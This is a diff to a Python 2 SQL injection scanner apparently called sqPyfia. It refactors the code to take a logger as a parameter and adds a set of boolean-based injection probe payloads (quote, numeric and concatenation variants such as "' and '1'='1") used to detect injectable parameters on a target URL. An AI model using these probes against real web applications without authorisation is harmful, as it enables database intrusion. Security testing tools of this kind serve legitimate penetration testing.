@@ -19,6 +19,7 @@ import sys
 import logging
 import copy
 import threading
+import database
 
 from xml.dom.minidom import Document
 
@@ -49,9 +50,10 @@ class DynamicAbs:
 
 class DynamicErrWord(DynamicAbs):
 	''' Abstraccion basada en calculo de MD5 '''
-	def __init__(self,var,method,req):
+	def __init__(self,var,method,req,logger):
 		DynamicAbs.__init__(self,var,method,req)
 		self.word=None
+		self.logger=logger
 
 	def addOrigResponse (self,OrigResponse):
 		print "ORIGWORDS!!!!!"
@@ -61,7 +63,7 @@ class DynamicErrWord(DynamicAbs):
 		'''Devuelve CIERTO si HAY DIFERENCIAS despues de una INYECCION'''
 		newWords=getRESPONSEMd5(BadResponse)
 
-		logging.debug("\tequal Response - Orig: %s, Current: %s" % (self.origWords,newWords))
+		logger.debug("\tequal Response - Orig: %s, Current: %s" % (self.origWords,newWords))
 		if newWords!=self.origWords:
 			return True
 		
@@ -79,8 +81,9 @@ class DynamicErrWord(DynamicAbs):
 
 class DynamicWordsDistance(DynamicAbs):
 	'''Abstraccion basada en distancia de vector de palabras'''
-	def __init__(self,var,method,req):
+	def __init__(self,var,method,req,logger):
 		DynamicAbs.__init__(self,var,method,req)
+		self.logger=logger
 
 	def addOrigResponse (self,OrigResponse):
 		self.origWords=getResponseWords(OrigResponse)
@@ -91,7 +94,7 @@ class DynamicWordsDistance(DynamicAbs):
 
 		dis=distance(self.origWords,newWords)
 
-		logging.debug("\tequal Response - Orig: %s, Current: %s, distance: %d" % (len(self.origWords),len(newWords),dis))
+		self.logger.debug("\tequal Response - Orig: %s, Current: %s, distance: %d" % (len(self.origWords),len(newWords),dis))
 		if dis<90:
 			return True
 		
@@ -105,7 +108,8 @@ class DynamicWordsDistance(DynamicAbs):
 
 class sqPyfia:
 
-	def __init__(self,req):
+	def __init__(self,req,logger=logging.getLogger()):
+		self.logger=logger
 		self.req=req
 		req.setTotalTimeout(100)
 
@@ -119,14 +123,49 @@ class sqPyfia:
 
 		self.reqExample=None
 
-		self.LOG=[]
 
-	def getLogs(self):
-		self.semMUTEX.acquire()
-		a=self.LOG[:]
-		self.LOG=[]
-		self.semMUTEX.release()
-		return a
+		
+		
+		InjTests=[]
+		tmp=tests.InjectTry(TUnescaped,self.logger)
+		tmp.addTry(" and 1=1",True)
+		tmp.addTry(" and 1=2",False)
+		tmp.addTry(" and NoVale",False)
+		InjTests.append(tmp)
+		
+		tmp=tests.InjectTry(TSingleQuote,self.logger)
+		tmp.addTry("' and '1'='1",True)
+		tmp.addTry("' and '1'='2",False)
+		tmp.addTry("' and NoVale",False)
+		InjTests.append(tmp)
+		
+		tmp=tests.InjectTry(TDoubleQuote,self.logger)
+		tmp.addTry("\" and \"1\"=\"1",True)
+		tmp.addTry("\" and \"1\"=\"2",False)
+		tmp.addTry("\" and NoVale",False)
+		InjTests.append(tmp)
+		
+		tmp=tests.InjectTry(TNumeric,self.logger)
+		tmp.addTry("-21+21",True)
+		tmp.addTry("-21",False)
+		tmp.addTry("-NoVale",False)
+		InjTests.append(tmp)
+		
+		tmp=tests.InjectTry(TConcatPipe,self.logger)
+		tmp.addTry("'||lower('')||'",True)
+		tmp.addTry("'||'21",False)
+		tmp.addTry("'||Novale",False)
+		InjTests.append(tmp)
+		
+		tmp=tests.InjectTry(TConcatPlus,self.logger)
+		tmp.addTry("'+lower('')+'",True)
+		tmp.addTry("'+'21",False)
+		tmp.addTry("'+Novale",False)
+		InjTests.append(tmp)
+		
+		
+		self.INJECTIONTESTS=tests.InjectionTest(InjTests)
+		self.FINGERTESTS=tests.FingerprintTest(database.FingerTests,self.logger)
 
 	def getRequestExample(self):
 		return self.reqExample
@@ -139,20 +178,20 @@ class sqPyfia:
 
 	def stability (self):              ### Comprueba la estabilidad de la URL y establece el MD5 de la response Original
 		self.req.perform()
-		logging.debug("Stab 1 - DONE")
+		self.logger.debug("Stab 1 - DONE")
 	
 		resp1=self.req.response
 		time.sleep(1.5)
 		self.req.perform()
-		logging.debug("Stab 2 - DONE")
+		self.logger.debug("Stab 2 - DONE")
 		resp2=self.req.response
 	
 		if getRESPONSEMd5(resp1)!=getRESPONSEMd5(resp2):
-			logging.debug("Stability FAILED - "+str(self.req))
+			self.logger.debug("Stability FAILED - "+str(self.req))
 			return False
 
 		self.origResponse=resp1
-		logging.debug("URL is STABLE")
+		self.logger.debug("URL is STABLE")
 		return True
 
 	def dynamism (self):
@@ -194,7 +233,7 @@ class sqPyfia:
 			else:
 				var=req.getPOSTVars()[pos]
 
-			logging.debug("Trying dynamic parameter - "+method+" - "+var.name)
+			self.logger.debug("Trying dynamic parameter - "+method+" - "+var.name)
 
 			var.append("x,'\"QnoVale")
 	
@@ -203,33 +242,32 @@ class sqPyfia:
 			HTMLNew=req.response
 			HTMLNew.Substitute("x,'\"QnoVale","")
 	
-			#DynObj=DynamicErrWord(var,method,req)
-			DynObj=DynamicWordsDistance(var,method,req)
+			#DynObj=DynamicErrWord(var,method,req,self.logger)
+			DynObj=DynamicWordsDistance(var,method,req,self.logger)
 			DynObj.addOrigResponse(self.origResponse)
 			
 			var.restore()
 
 			if DynObj.getInfo(HTMLNew):
-				logging.debug("Parameter - "+method+" - "+var.name+" is dynamic")
+				self.logger.debug("Parameter - "+method+" - "+var.name+" is dynamic")
 				dynres=sqResult(DynObj)
 				self.dynamics.append(dynres)
-				if self.MakeTest(dynres,tests.INJECTIONTESTS):
+				if self.MakeTest(dynres,self.INJECTIONTESTS):
 					self.injResults.append(dynres)
 					self.dynamics.remove(dynres)
-					if self.MakeTest(dynres,tests.FINGERTESTS):
+					if self.MakeTest(dynres,self.FINGERTESTS):
 						self.fingerResults.append(dynres)
 						self.injResults.remove(dynres)
 	
 			if self.threaded:
 				self.semTHREADS.release()
 		except Exception,a:
+			print a
 			if self.threaded:
 				self.semTHREADS.release()
-			self.semMUTEX.acquire()
-			self.LOG.append( "SqPyfia:"+str(a)+" - "+str(req))
-			self.semMUTEX.release()
+			self.logger.debug( "SqPyfia:"+str(a)+" - "+str(req))
 
-		logging.debug("END WITH PARAMETER - "+method+" - "+var.name)
+		self.logger.debug("END WITH PARAMETER - "+method+" - "+var.name)
 			
 
 			
@@ -244,10 +282,12 @@ class sqPyfia:
 		return False
 
 	def launch(self):
+		self.logger.debug("====================================================\r\nTrying sql Injection on:  %s \r\n====================================================" % (str(self.req)))
 		if self.threaded:
 			self.launchThreads()
 		else:
 			self.launchSerial()
+		self.logger.debug("++++++++++++++++++++++++++++++++++++++++++++++++++++\r\nFINISH ATTACK sql Injection on:  %s \r\n++++++++++++++++++++++++++++++++++++++++++++++++++++" % (str(self.req)))
 
 	def launchThreads(self):
 		if not self.stability():
